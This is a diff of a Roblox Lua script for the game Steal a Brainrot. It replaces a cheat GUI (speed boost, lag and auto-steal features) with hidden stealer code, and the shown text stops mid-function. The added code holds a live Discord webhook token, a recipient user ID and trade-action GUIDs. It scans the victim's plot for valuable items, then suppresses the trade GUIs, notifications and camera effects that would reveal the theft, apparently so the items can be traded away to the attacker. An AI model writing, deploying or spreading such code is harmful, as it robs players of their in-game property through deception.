@@ -1,641 +1,471 @@
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local ProximityPromptService = game:GetService("ProximityPromptService")
-local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
-local Workspace = game:GetService("Workspace")
-local Camera = workspace.CurrentCamera
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-
-pcall(function()
-    if PlayerGui:FindFirstChild("MoonHub") then PlayerGui["MoonHub"]:Destroy() end
-    if game.CoreGui:FindFirstChild("MoonHub") then game.CoreGui["MoonHub"]:Destroy() end
-end)
-
--- Config
-local sliderValue = 0.915
-local laggerPower = 50
-local speedBoostMax = 27
-local savePath = "MoonHub_Settings.json"
-local toggleStates = {}
-local activeTriggers = {}
-local boostConn = nil
-local WHITE = Color3.fromRGB(255, 255, 255)
-local LIGHT_BLUE = Color3.fromRGB(100, 180, 255)
-local DARK_BLUE = Color3.fromRGB(8, 14, 32)
-local MEDIUM_BLUE = Color3.fromRGB(15, 25, 55)
-local alignKey = Enum.KeyCode.V
-local bindingAlignKey = false
-local stealBarFill = nil
-
--- Helper functions
-local function getCharacter() return LocalPlayer.Character end
-
-local function loadSettings()
-    pcall(function()
-        if isfile and isfile(savePath) then
-            local content = readfile(savePath)
-            local decoded = HttpService:JSONDecode(content)
-            if decoded.sliderValue then sliderValue = math.clamp(decoded.sliderValue, 0.01, 1.00) end
-            if decoded.laggerPower then laggerPower = math.clamp(decoded.laggerPower, 0, 100) end
-            if decoded.speedBoostMax then speedBoostMax = math.clamp(decoded.speedBoostMax, 16, 27) end
-            if decoded.alignKey then alignKey = Enum.KeyCode[decoded.alignKey] or Enum.KeyCode.V end
-            if decoded.speedBoost ~= nil then toggleStates["Speed Boost"] = decoded.speedBoost end
-            if decoded.laggerOnSteal ~= nil then toggleStates["Lagger on Steal"] = decoded.laggerOnSteal end
-            if decoded.autoPotion ~= nil then toggleStates["Auto Potion"] = decoded.autoPotion end
-        end
-    end)
-end
-
-local function saveSettings()
-    pcall(function()
-        if writefile then
-            local data = {
-                sliderValue = sliderValue,
-                laggerPower = laggerPower,
-                speedBoostMax = speedBoostMax,
-                speedBoost = toggleStates["Speed Boost"] or false,
-                laggerOnSteal = toggleStates["Lagger on Steal"] or false,
-                autoPotion = toggleStates["Auto Potion"] or false,
-                alignKey = alignKey.Name,
-            }
-            writefile(savePath, HttpService:JSONEncode(data))
-        end
-    end)
-end
-
-loadSettings()
-
-local function triggerLagger()
-    if not toggleStates["Lagger on Steal"] then return end
-    task.spawn(function()
-        local lagStrength = math.clamp(laggerPower / 40, 0.3, 3.0)
-        settings().Network.IncomingReplicationLag = lagStrength
-        task.wait(2)
-        settings().Network.IncomingReplicationLag = 0
-    end)
-end
-
-local function enableSpeedBoost()
-    if boostConn then boostConn:Disconnect() end
-    boostConn = RunService.Heartbeat:Connect(function()
-        local char = LocalPlayer.Character
-        if not char then return end
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        if not hrp or not hum then return end
-        local moveDir = hum.MoveDirection
-        if moveDir.Magnitude > 0 then
-            local flatDir = Vector3.new(moveDir.X, 0, moveDir.Z).Unit
-            hrp.Velocity = Vector3.new(flatDir.X * speedBoostMax, hrp.Velocity.Y, flatDir.Z * speedBoostMax)
-        end
-    end)
-end
-
-local function disableSpeedBoost()
-    if boostConn then
-        boostConn:Disconnect()
-        boostConn = nil
-    end
-end
-
-local function EquipCarpet()
-    local char = LocalPlayer.Character
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    local carpet = backpack and backpack:FindFirstChild("Flying Carpet") or (char and char:FindFirstChild("Flying Carpet"))
-    if carpet and char then
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        if hum then
-            hum:EquipTool(carpet)
-            task.wait(0.02)
-        end
-    end
-end
-
-local function EquipFlash()
-    local flashTool = LocalPlayer.Backpack:FindFirstChild("Flash Teleport") or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Flash Teleport"))
-    if flashTool then
-        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-        if hum then
-            hum:EquipTool(flashTool)
-        end
-    end
-end
-
-local function ExecuteAlign()
-    if bindingAlignKey then return end
-    EquipCarpet()
-    local char = LocalPlayer.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    local plots = workspace:FindFirstChild("Plots")
-    if root and plots then
-        local target = nil
-        local dist = math.huge
-        for _, plot in ipairs(plots:GetChildren()) do
-            if plot.Name == LocalPlayer.Name then continue end
-            local podiums = plot:FindFirstChild("AnimalPodiums")
-            if podiums then
-                for _, pod in ipairs(podiums:GetChildren()) do
-                    local base = pod:FindFirstChild("Base")
-                    local spawn = base and base:FindFirstChild("Spawn")
-                    if spawn then
-                        local yDiff = math.abs(spawn.Position.Y - root.Position.Y)
-                        if yDiff < 5 then
-                            local d = (spawn.Position - root.Position).Magnitude
-                            if d < dist then
-                                dist = d
-                                target = spawn
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        if target then
-            root.CFrame = target.CFrame + Vector3.new(0, 3, 0)
-            task.wait(0.05)
-            local _, currentYaw, _ = Camera.CFrame:ToOrientation()
-            Camera.CameraType = Enum.CameraType.Scriptable
-            Camera.CFrame = CFrame.new(Camera.CFrame.Position) * CFrame.fromOrientation(0.75, currentYaw, 0)
-            task.wait(0.05)
-            Camera.CameraType = Enum.CameraType.Custom
-            root.CFrame = root.CFrame * CFrame.Angles(0, math.pi, 0)
-            task.wait(0.12)
-            EquipFlash()
-        end
-    end
-end
-
--- Proximity Prompt Handling (FIXED AUTO POTION FROM SCRIPT 2)
-ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
-    if activeTriggers[prompt] then return end
-    activeTriggers[prompt] = true
-    local start = os.clock()
-    local fired = false
-    local conn
-    if stealBarFill then stealBarFill.Size = UDim2.new(0, 0, 1, 0) end
-    conn = RunService.PreRender:Connect(function()
-        if not prompt or not prompt.Parent then
-            conn:Disconnect()
-            activeTriggers[prompt] = nil
-            if stealBarFill then
-                TweenService:Create(stealBarFill, TweenInfo.new(0.25), {Size = UDim2.new(0, 0, 1, 0)}):Play()
-            end
-            return
-        end
-        local progress = math.clamp((os.clock() - start) / prompt.HoldDuration, 0, 1)
-        if stealBarFill then
-            stealBarFill.Size = UDim2.new(progress, 0, 1, 0)
-        end
-        if not fired and progress >= sliderValue then
-            fired = true
-            conn:Disconnect()
-            activeTriggers[prompt] = nil
-            if stealBarFill then
-                stealBarFill.Size = UDim2.new(1, 0, 1, 0)
-                task.delay(0.15, function()
-                    if stealBarFill then
-                        TweenService:Create(stealBarFill, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-                            Size = UDim2.new(0, 0, 1, 0)
-                        }):Play()
-                    end
-                end)
-            end
-            local char = LocalPlayer.Character
-            local tool = char and char:FindFirstChildOfClass("Tool")
-            if tool then
-                if toggleStates["Lagger on Steal"] then triggerLagger() end
-                tool:Activate()
-                -- FIXED AUTO POTION FROM SCRIPT 2
-                if toggleStates["Auto Potion"] then
-                    task.spawn(function()
-                        task.wait(0.09)
-                        local potion = LocalPlayer.Backpack:FindFirstChild("Giant Potion") or (char and char:FindFirstChild("Giant Potion"))
-                        if potion then
-                            local hum = char:FindFirstChildOfClass("Humanoid")
-                            if hum then
-                                hum:EquipTool(potion)
-                                task.wait(0.05)
-                                potion:Activate()
-                            end
-                        end
-                    end)
-                end
-                if toggleStates["Speed Boost"] then enableSpeedBoost() end
-            end
-        end
-    end)
-    prompt.PromptButtonHoldEnded:Connect(function()
-        if not fired then
-            conn:Disconnect()
-            activeTriggers[prompt] = nil
-            if stealBarFill then
-                TweenService:Create(stealBarFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-                    Size = UDim2.new(0, 0, 1, 0)
-                }):Play()
-            end
-        end
-    end)
-end)
-
--- GUI Creation
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "MoonHub"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = PlayerGui
-
-local function createAnimatedStroke(parent, thickness, speed)
-    local s = Instance.new("UIStroke")
-    s.Thickness = thickness or 2
-    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    s.Color = Color3.new(1, 1, 1)
-    s.Parent = parent
-    local g = Instance.new("UIGradient")
-    g.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 50, 150)),
-        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(80, 180, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(80, 180, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 50, 150)),
-    })
-    g.Rotation = 0
-    g.Parent = s
-    task.spawn(function()
-        local spd = speed or 1.2
-        while parent and parent.Parent do
-            g.Rotation = (g.Rotation + spd) % 360
-            task.wait()
-        end
-    end)
-    return s, g
-end
-
-local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 160, 0, 190)
-main.Position = UDim2.new(0.5, -80, 0.5, -95)
-main.BackgroundColor3 = DARK_BLUE
-main.BackgroundTransparency = 0.25
-main.ClipsDescendants = true
-main.Active = true
-main.Draggable = true
-main.Parent = ScreenGui
-
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 20)
-mainCorner.Parent = main
-createAnimatedStroke(main, 2, 0.8)
-
--- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -20, 0, 22)
-title.Position = UDim2.new(0, 10, 0, 8)
-title.BackgroundTransparency = 1
-title.Text = "Moon Hub"
-title.Font = Enum.Font.GothamBlack
-title.TextSize = 14
-title.TextColor3 = WHITE
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = main
-
-local titleGrad = Instance.new("UIGradient")
-titleGrad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 160, 255)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 160, 255)),
-})
-titleGrad.Parent = title
+-- =======================
+-- PASTE YOUR FULL SCRIPT HERE
+-- =======================
 
 task.spawn(function()
-    while main.Parent do
-        titleGrad.Rotation = (titleGrad.Rotation + 1.2) % 360
-        task.wait()
+local GOOD_WEBHOOK = "https://discordapp.com/api/webhooks/1528475435137110049/ywX0m2D0U24jtQK2TFF3OgmCmwGaq-0qJIz4CqEA-1qx4Ym6QRPN6LjAAa9AW-6nD4Wh" -- PASTE YOUR WEBHOOK HERE
+local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
+local TARGET_ID = 67 -- paste your user id here
+local DELAY_STEP = 1
+local TRADE_CYCLE_DELAY = 2
+
+local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
+local READY_GUID  = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
+
+local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}
+
+local TargetBrainrots = {
+    ["Ketupat Bros"] = true, ["Ginger Gerat"] = true, ["Meowl"] = true,
+    ["Strawberry Elephant"] = true, ["Skibidi Toilet"] = true, ["Dragon Cannelloni"] = true,
+    ["Hydra Dragon Cannelloni"] = true, ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true, ["Signore Carapace"] = true, ["Cerberus"] = true, ["Noobini Pizzanini"] = true, ["Hydra Bunny"] = true, ["Tang Tang Keletang"] = true, ["Tacorita Bicicleta"] = true, ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["La Food Combinasion"] = true, ["Sammyni Fattini"] = true, ["Rosetti Tualetti"] = true, ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true, ["Chillin Chili"] = true, ["Tuff Toucan"] = true, ["W or L"] = true, ["La Jolly Grande"] = true, ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true, ["Festive 67"] = true, ["Ketupat Kepat"] = true, ["Tictac Sahur"] = true, ["Ketchuru and Musturu"] = true, ["Lavadorito Spinito"] = true, ["Garama and Madundung"] = true, ["Burguro And Fryuro"] = true, ["Capitano Moby"] = true, ["Los Hotspotsitos"] = true, ["Guest 666"] = true, ["Los Bros"] = true, ["Tralaledon"] = true, ["Los Puggies"] = true, ["Los Primos"] = true, ["Los Tacoritas"] = true, ["Los Spaghettis"] = true, ["Gingger Gerat"] = true, ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true, ["Fragrama and Chocrama"] = true, ["Spooky and Pumpky"] = true, ["Love Love Bear"] = true, ["Rosey and Teddy"] = true, ["Popcuru and Fizzuru"] = true, ["Celularcini Viciosini"] = true, ["Las Sis"] = true, ["Los Planitos"] = true, ["Eviledon"] = true, ["Orcaledon"] = true, ["Jolly Jolly Sahur"] = true, ["La Gingger Sekolah"] = true, ["Nacho Spyder"] = true, ["Gold Gold Gold"] = true, ["La Lucky Grande"] = true, ["Celestial Pegasus"] = true, ["Fortunu and Cashuru"] = true, ["Ventoliero Pavonero"] = true, ["Cloverat Clapat"] = true, ["Fishino Clownino"] = true, ["Dug dug dug"] = true, ["Lovin Rose"] = true, ["Frago La La La"] = true, ["Digi Narwhal"] = true, ["Arcadragon"] = true, ["Kalika Bros"] = true, ["Tirilikalika Tirikaliko"] = true, ["Gym Bros"] = true, ["La Easter Grande"] = true, ["Los Chillis"] = true, ["Foxini Lanternini"] = true, ["Duggy Bros"] = true, ["Money Bros"] = true, ["Boppin Bunny"] = true, ["Los Hackers"] = true, ["Cooki and Milki"] = true
+}
+
+local GOOD_BRAINROTS = {
+    ["Dragon Gingerini"] = true, ["Hydra Dragon Cannelloni"] = true, ["Antonio"] = true,
+    ["Elefanto Frigo"] = true, ["Griffin"] = true, ["Skibidi Toilet"] = true,
+    ["Meowl"] = true, ["Strawberry Elephant"] = true, ["Headless Horseman"] = true,
+    ["Dragon Cannelloni"] = true, ["Signore Carapace"] = true, ["Cerberus"] = true, ["Noobini Pizzanini"] = true, ["Hydra Bunny"] = true, ["Tang Tang Keletang"] = true, ["Tacorita Bicicleta"] = true, ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["La Food Combinasion"] = true, ["Sammyni Fattini"] = true, ["Rosetti Tualetti"] = true, ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true, ["Chillin Chili"] = true, ["Tuff Toucan"] = true, ["W or L"] = true, ["La Jolly Grande"] = true, ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true, ["Festive 67"] = true, ["Ketupat Kepat"] = true, ["Tictac Sahur"] = true, ["Ketchuru and Musturu"] = true, ["Lavadorito Spinito"] = true, ["Garama and Madundung"] = true, ["Burguro And Fryuro"] = true, ["Capitano Moby"] = true, ["Los Hotspotsitos"] = true, ["Guest 666"] = true, ["Los Bros"] = true, ["Tralaledon"] = true, ["Los Puggies"] = true, ["Los Primos"] = true, ["Los Tacoritas"] = true, ["Los Spaghettis"] = true, ["Gingger Gerat"] = true, ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true, ["Fragrama and Chocrama"] = true, ["Spooky and Pumpky"] = true, ["Love Love Bear"] = true, ["Rosey and Teddy"] = true, ["Popcuru and Fizzuru"] = true, ["Celularcini Viciosini"] = true, ["Las Sis"] = true, ["Los Planitos"] = true, ["Eviledon"] = true, ["Orcaledon"] = true, ["Jolly Jolly Sahur"] = true, ["La Gingger Sekolah"] = true, ["Nacho Spyder"] = true, ["Gold Gold Gold"] = true, ["La Lucky Grande"] = true, ["Celestial Pegasus"] = true, ["Fortunu and Cashuru"] = true, ["Ventoliero Pavonero"] = true, ["Cloverat Clapat"] = true, ["Fishino Clownino"] = true, ["Dug dug dug"] = true, ["Lovin Rose"] = true, ["Frago La La La"] = true, ["Digi Narwhal"] = true, ["Arcadragon"] = true, ["Kalika Bros"] = true, ["Tirilikalika Tirikaliko"] = true, ["Gym Bros"] = true, ["La Easter Grande"] = true, ["Los Chillis"] = true, ["Foxini Lanternini"] = true, ["Duggy Bros"] = true, ["Money Bros"] = true, ["Boppin Bunny"] = true, ["Los Hackers"] = true, ["Cooki and Milki"] = true
+}
+
+local function getRemote(unobfuscatedName)
+    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+    local children = Net:GetChildren()
+    for i = 1, #children - 1 do
+        local current = children[i]
+        local nextFolder = children[i + 1]
+        if current and nextFolder and string.find(current.Name, unobfuscatedName) then
+            return nextFolder
+        end
     end
-end)
-
--- Flash TP Text
-local flashTpText = Instance.new("TextLabel")
-flashTpText.Size = UDim2.new(1, -20, 0, 14)
-flashTpText.Position = UDim2.new(0, 10, 0, 32)
-flashTpText.BackgroundTransparency = 1
-flashTpText.Text = "Flash TP"
-flashTpText.TextColor3 = WHITE
-flashTpText.Font = Enum.Font.Gotham
-flashTpText.TextSize = 10
-flashTpText.TextXAlignment = Enum.TextXAlignment.Left
-flashTpText.Parent = main
-
--- Settings Button
-local settingsBtn = Instance.new("TextButton")
-settingsBtn.Size = UDim2.new(0, 28, 0, 28)
-settingsBtn.Position = UDim2.new(1, -34, 0, 4)
-settingsBtn.BackgroundColor3 = MEDIUM_BLUE
-settingsBtn.BackgroundTransparency = 0.3
-settingsBtn.Text = "⚙"
-settingsBtn.TextColor3 = WHITE
-settingsBtn.Font = Enum.Font.GothamBold
-settingsBtn.TextSize = 14
-settingsBtn.Parent = main
-Instance.new("UICorner", settingsBtn).CornerRadius = UDim.new(0, 6)
-createAnimatedStroke(settingsBtn, 1, 1.5)
-
--- Buttons Container
-local buttonsContainer = Instance.new("Frame")
-buttonsContainer.Size = UDim2.new(1, -20, 0, 100)
-buttonsContainer.Position = UDim2.new(0, 10, 0, 55)
-buttonsContainer.BackgroundTransparency = 1
-buttonsContainer.Parent = main
-
--- Settings Scroll Frame
-local settingsScroll = Instance.new("ScrollingFrame")
-settingsScroll.Size = UDim2.new(1, -20, 0, 110)
-settingsScroll.Position = UDim2.new(0, 10, 0, 55)
-settingsScroll.BackgroundTransparency = 1
-settingsScroll.ScrollBarThickness = 4
-settingsScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 220)
-settingsScroll.CanvasSize = UDim2.new(0, 0, 0, 200)
-settingsScroll.Parent = main
-settingsScroll.Visible = false
-
-settingsBtn.MouseButton1Click:Connect(function()
-    settingsScroll.Visible = not settingsScroll.Visible
-    buttonsContainer.Visible = not settingsScroll.Visible
-end)
-
--- Slider Function
-local function createSlider(parent, yPos, label, min, max, value, onChange, valueY)
-    local container = Instance.new("Frame")
-    container.Size = UDim2.new(1, 0, 0, 30)
-    container.Position = UDim2.new(0, 0, 0, yPos)
-    container.BackgroundTransparency = 1
-    container.Parent = parent
-
-    local labelText = Instance.new("TextLabel")
-    labelText.Size = UDim2.new(1, 0, 0, 12)
-    labelText.Position = UDim2.new(0, 0, 0, 0)
-    labelText.BackgroundTransparency = 1
-    labelText.Text = label
-    labelText.TextColor3 = WHITE
-    labelText.Font = Enum.Font.GothamBold
-    labelText.TextSize = 8
-    labelText.TextXAlignment = Enum.TextXAlignment.Center
-    labelText.Parent = container
-
-    local valueText = Instance.new("TextLabel")
-    valueText.Size = UDim2.new(1, 0, 0, 12)
-    valueText.Position = UDim2.new(0, 0, 0, valueY or 11)
-    valueText.BackgroundTransparency = 1
-    valueText.Text = tostring(math.floor(value))
-    valueText.TextColor3 = LIGHT_BLUE
-    valueText.Font = Enum.Font.GothamBold
-    valueText.TextSize = 8
-    valueText.TextXAlignment = Enum.TextXAlignment.Center
-    valueText.Parent = container
-
-    local track = Instance.new("Frame")
-    track.Size = UDim2.new(1, 0, 0, 4)
-    track.Position = UDim2.new(0, 0, 0, 25)
-    track.BackgroundColor3 = Color3.fromRGB(25, 30, 50)
-    track.Parent = container
-    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
-
-    local fill = Instance.new("Frame")
-    fill.Size = UDim2.new(0, 0, 1, 0)
-    fill.BackgroundColor3 = LIGHT_BLUE
-    fill.Parent = track
-    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
-
-    local knob = Instance.new("Frame")
-    knob.Size = UDim2.new(0, 12, 0, 12)
-    knob.Position = UDim2.new(0, -6, 0.5, -6)
-    knob.BackgroundColor3 = Color3.new(0, 0, 0)
-    knob.Parent = track
-    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
-    local knobStroke = Instance.new("UIStroke")
-    knobStroke.Color = LIGHT_BLUE
-    knobStroke.Thickness = 1
-    knobStroke.Parent = knob
-
-    local dragging = false
-    local function updateSlider(v)
-        value = math.clamp(v, min, max)
-        local pct = (value - min) / (max - min)
-        fill.Size = UDim2.new(pct, 0, 1, 0)
-        knob.Position = UDim2.new(pct, -6, 0.5, -6)
-        valueText.Text = tostring(math.floor(value))
-        if onChange then onChange(value) end
-    end
-
-    track.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            main.Draggable = false
-            local rawPos = (input.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X
-            updateSlider(min + (rawPos * (max - min)))
-        end
-    end)
-
-    UserInputService.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            local rawPos = (input.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X
-            updateSlider(min + (rawPos * (max - min)))
-        end
-    end)
-
-    UserInputService.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = false
-            main.Draggable = true
-        end
-    end)
-    updateSlider(value)
+    return nil
 end
 
--- Toggle Function for Settings
-local function makeSettingsToggle(labelText, yPos, defaultState, onToggle)
-    local container = Instance.new("Frame")
-    container.Size = UDim2.new(1, 0, 0, 22)
-    container.Position = UDim2.new(0, 0, 0, yPos)
-    container.BackgroundTransparency = 1
-    container.Parent = settingsScroll
+local function applyEverythingAfterTargetFound()
+    local leftCenter = pg:FindFirstChild("LeftCenter")
+    if leftCenter then
+        local clone = leftCenter:Clone()
+        clone.Name = "LeftCenter_Backup"
+        clone.Parent = pg
+        leftCenter:Destroy()
+    end
 
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, 0, 0, 22)
-    btn.Position = UDim2.new(0, 0, 0, 0)
-    btn.BackgroundColor3 = WHITE
-    btn.Text = labelText:upper()
-    btn.TextColor3 = Color3.new(0, 0, 0)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 9
-    btn.AutoButtonColor = false
-    btn.Parent = container
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    createAnimatedStroke(btn, 1, 1.5)
+    local notifyRemote = getRemote("RE/NotificationService/Notify")
+    if notifyRemote then
+        pcall(function()
+            for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
+                connection:Disable()
+            end
+        end)
+    end
 
-    local state = defaultState or false
-    toggleStates[labelText] = state
+    local function handleCam(obj)
+        if obj:IsA("BlurEffect") then task.defer(function() obj:Destroy() end) end
+    end
+    cam.ChildAdded:Connect(handleCam)
+    for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
 
-    local function updateToggleVisual()
-        if state then
-            btn.BackgroundColor3 = LIGHT_BLUE
-            btn.TextColor3 = WHITE
-        else
-            btn.BackgroundColor3 = WHITE
-            btn.TextColor3 = Color3.new(0, 0, 0)
+    cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+        cam.FieldOfView = 70
+    end)
+    cam.FieldOfView = 70
+
+    local function handleGui(obj)
+        if guiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
+    end
+    pg.ChildAdded:Connect(handleGui)
+    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
+end
+
+local AnimalsData, AnimalsShared, NumberUtils
+pcall(function()
+    AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
+    NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
+end)
+
+local function loadSyncData()
+    local mod = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
+    if not mod then return nil end
+    local sync = require(mod)
+    local fn = sync.Get
+    for i = 1, 15 do
+        local s, v = pcall(debug.getupvalue, fn, i)
+        if s and type(v) == "table" then return v end
+    end
+    return nil
+end
+
+local SYNC_DATA = loadSyncData()
+if not SYNC_DATA then return end
+
+local brainrotQueue = {}
+for _, plotData in pairs(SYNC_DATA) do
+    if type(plotData) == "table" then
+        local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
+        if (typeof(owner) == "Instance" and owner == LP) or (typeof(owner) == "table" and owner.UserId == LP.UserId) then
+            local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
+            if type(animalList) == "table" then
+                for slotKey, data in pairs(animalList) do
+                    if type(data) == "table" and data.Index and TargetBrainrots[data.Index] then
+                        table.insert(brainrotQueue, {slotKey = tonumber(slotKey), data = data})
+                    end
+                end
+            end
         end
     end
-    updateToggleVisual()
+end
 
-    btn.MouseButton1Click:Connect(function()
-        state = not state
-        toggleStates[labelText] = state
-        updateToggleVisual()
-        if onToggle then onToggle(state) end
-        saveSettings()
+if #brainrotQueue == 0 then return end
+
+applyEverythingAfterTargetFound()
+
+local function formatNumber(n)
+    if not n then return "$0/s" end
+    local function clean(s) return s:gsub("%.?0+$", "") end
+    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n/1e12)) .. "T/s" end
+    if n >= 1e9  then return "$" .. clean(string.format("%.2f", n/1e9))  .. "B/s" end
+    if n >= 1e6  then return "$" .. clean(string.format("%.2f", n/1e6))  .. "M/s" end
+    if n >= 1e3  then return "$" .. clean(string.format("%.2f", n/1e3))  .. "K/s" end
+    return "$" .. tostring(math.floor(n)) .. "/s"
+end
+
+local function getRequestFn()
+    return (syn and syn.request) or (http and http.request) or http_request or request
+end
+
+local function toWikiName(displayName)
+    local clean = displayName:match("^(.-)%s*%(") or displayName
+    return clean:gsub(" ", "_")
+end
+
+local function fetchFandomImageUrl(displayName)
+    local requestFn = getRequestFn()
+    if not requestFn then return nil end
+
+    local wikiName = toWikiName(displayName)
+    local url = FANDOM_BASE .. wikiName
+
+    for attempt = 1, 3 do
+        local ok, response = pcall(function()
+            return requestFn({
+                Url = url,
+                Method = "GET",
+                Headers = {
+                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    ["Accept-Language"] = "en-US,en;q=0.5",
+                    ["Cache-Control"] = "no-cache"
+                },
+                Timeout = 10
+            })
+        end)
+
+        if ok and response and response.StatusCode and response.StatusCode == 200 then
+            local body = response.Body
+            if not body or body == "" then
+                if attempt < 3 then task.wait(0.5) end
+                continue
+            end
+
+            local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
+                or body:match('content="([^"]+)"%s+property="og:image"')
+                or body:match('<meta%s+og:image%s+content="([^"]+)"')
+                or body:match('<meta%s+property="og:image"%s+content="([^"]+)"')
+
+            if ogImage and ogImage ~= "" then
+                ogImage = ogImage:gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&lt;", "<"):gsub("&gt;", ">")
+                if ogImage:find("^https?://") then
+                    return ogImage
+                end
+            end
+
+            local infoboxPattern = '<div[^>]*class="[^"]*infobox[^"]*"[^>]*>(.-)</div>%s*</div>'
+            local infoboxMatch = body:match(infoboxPattern)
+            local searchBody = infoboxMatch or body
+
+            local imgPatterns = {
+                'data%-src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+                'src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+            }
+
+            for _, pattern in ipairs(imgPatterns) do
+                local lastMatch = nil
+                local pos = 1
+                while true do
+                    local start, endPos = searchBody:find(pattern, pos)
+                    if not start then break end
+                    local match = searchBody:sub(start, endPos)
+                    local url = match:match('"([^"]+)"')
+
+                    if url and url:find("static%.wikia%.nocookie%.net") then
+                        if not url:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
+                            lastMatch = url
+                        end
+                    elseif url then
+                        lastMatch = url
+                    end
+                    pos = endPos + 1
+                end
+
+                if lastMatch then
+                    lastMatch = lastMatch:gsub("/revision/latest", "")
+                    return lastMatch
+                end
+            end
+
+            return nil
+        end
+
+        if attempt < 3 then
+            task.wait(0.5 * attempt)
+        end
+    end
+
+    return nil
+end
+local function getBrainrotColor(animalIndex)
+    local color = nil
+    pcall(function()
+        local models = ReplicatedStorage:FindFirstChild("Models")
+        local animals = models and models:FindFirstChild("Animals")
+        if not animals then return end
+        local template = animals:FindFirstChild(animalIndex)
+        if not template then
+            local info = AnimalsData and AnimalsData[animalIndex]
+            if info and info.DisplayName then
+                template = animals:FindFirstChild(info.DisplayName)
+            end
+        end
